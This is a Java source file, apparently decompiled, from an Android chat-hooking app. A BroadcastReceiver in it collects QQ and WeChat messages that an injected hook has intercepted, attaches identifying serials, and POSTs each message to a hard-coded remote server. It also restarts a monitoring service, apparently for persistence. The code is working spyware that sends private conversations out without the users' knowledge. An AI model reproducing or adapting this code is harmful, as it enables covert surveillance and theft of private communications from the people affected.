package com.example.chathook;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;
import java.util.HashMap;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;

public class HookReceiver extends BroadcastReceiver {
    private static HashMap lastmsg = new HashMap();
    static String msg = "";
    boolean isQQ = true;

    class MsgTask extends AsyncTask<String, Integer, String> {
        MsgTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... params) {
            try {
                StringBuilder builder = new StringBuilder();
                if (HookReceiver.this.isQQ) {
                    builder.append(InjectApplicaiton.QQSN + "\n");
                } else {
                    builder.append(InjectApplicaiton.MMSN + "\n");
                }
                builder.append(params[0]);
                Log.i("ligan", " send server chat: \n" + builder.toString());
                HttpPost request = new HttpPost("http://tingfengzhe.sinaapp.com/record.php");
                request.setEntity(new ByteArrayEntity(builder.toString().getBytes("UTF8")));
                new DefaultHttpClient().execute(request);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onCancelled() {
            super.onCancelled();
        }
    }

    public void onReceive(Context context, Intent intent) {
        if ("learn.yincc.CHAT_UPDATE".equals(intent.getAction())) {
            boolean history = intent.getBooleanExtra("history", false);
            this.isQQ = intent.getBooleanExtra("isQQ", true);
            String stringExtra = intent.getStringExtra("chat");
            if (msg.equals(stringExtra)) {
                Log.i("ligan", "same msg ");
                return;
            }
            Log.i("ligan", "new msg ");
            msg = stringExtra;
            String[] ss;
            if (history) {
                Log.i("yincc", " history chat: \n" + stringExtra);
                ss = stringExtra.split("\n");
                String lastmsgtime = (String) lastmsg.get(ss[1]);
                Log.i("yincc", "lastmsgtime:" + lastmsgtime);
                Log.i("yincc", "who uin :" + ss[1] + " nick:" + ss[2]);
                if (lastmsgtime == null || lastmsgtime.compareTo(ss[4]) < 0) {
                    lastmsg.put(ss[1], ss[4]);
                    new MsgTask().execute(new String[]{stringExtra});
                    return;
                }
                return;
            }
            ss = stringExtra.split("\n");
            lastmsg.put(ss[1], ss[4]);
            Log.i("yincc", " current chat: \n" + stringExtra);
            new MsgTask().execute(new String[]{stringExtra});
            return;
        }
        context.startService(new Intent(context, ProcessMonitor.class));
    }
}
